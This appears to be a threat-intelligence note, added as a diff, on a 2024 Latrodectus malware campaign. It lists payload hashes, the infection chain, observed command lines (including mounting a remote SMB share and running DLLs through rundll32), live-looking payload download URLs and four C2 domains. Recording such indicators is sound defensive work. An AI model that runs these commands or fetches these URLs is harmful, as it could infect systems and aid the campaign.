@@ -1,0 +1,59 @@
+22.03.2024 | Latrodectus | Version 1.2 | CampaignID: Littlehw 
+
+*************************************************
+
+.url https://cuxu.org/RPyWKSqpQ
+.js 93f7e95461c18aee7b56651069104710c76f9e3d6543a0b3248a21b236859d99
+.msi d83d5378f1bb37d1423207ad67f2f984f2d46ba9534194c344a051117c1e541f
+.dll 71fb25cc4c05ce9dd94614ed781d85a50dccf69042521abc6782d48df85e6de9
+
+*************************************************
+
+url > .js > smb > .msi > .dll
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Letter_q50_63b944998-11n0283407179-6803z4.js
+
+net use A: \\sokingscrosshotel.com@80\share\ /persistent:no
+
+msiexec.exe /I C:\Users\Admin\AppData\Local\Temp\upd.msi
+
+msiexec.exe /V
+
+MsiExec.exe -Embedding 71CA78FC65AF17DF56CFF63FB420D092 C
+
+srtasks.exe ExecuteScopeRestorePoint /WaitForRestorePoint:2
+
+MsiExec.exe -Embedding E58E51DAEF2082DD1BBB73B86A4486C4
+
+MSI65D1.tmp C:\Windows\System32\rundll32.exe C:\Users\Admin\AppData\Local\besr\cr2.dll, vgml
+
+vssvc.exe
+
+rundll32.exe C:\Users\Admin\AppData\Local\besr\cr2.dll, vgml
+
+rundll32.exe C:\Users\Admin\AppData\Roaming\Custom_update\Update_33b0dade.dll, vgml 
+
+*************************************************
+
+.dll distro
+
+https://cuxu.org/RPyWKSqpQ
+https://pubonao.org/vl.php
+{"status":200,"link":"https:\/\/firebasestorage.googleapis.com\/v0\/b\/lim02-417109.appspot.com\/o\/QzWTWQyR47%2FDoc_b25_46u956486-99h92199q1251-9442b1.js?alt=media&token=98474d31-f355-4456-9b42-4e58213b5d9c"}
+
+https://zefos.org/?49118576&713281508&cmp=hoganlovells&dmc=wyoparks.wyo.gov&i=hq&u349746m47=1756008565
+https://zefos.org/vl.php
+https:\/\/firebasestorage.googleapis.com\/v0\/b\/lim02-417109.appspot.com\/o\/rmQfipJ593%2FLetter_d30_90b928990-46u58586c5734-4154a8.js?alt=media&token=57a0720f-d10d-4a54-9cad-f58cf6865cad"}
+
+
+
+*************************************************
+
+c2's
+
+https://titnovacrion.top/live/
+https://grunzalom.fun/live/
+https://ganstaeraop.shop/live/
+https://niceburlat.me/live/
+
+*************************************************
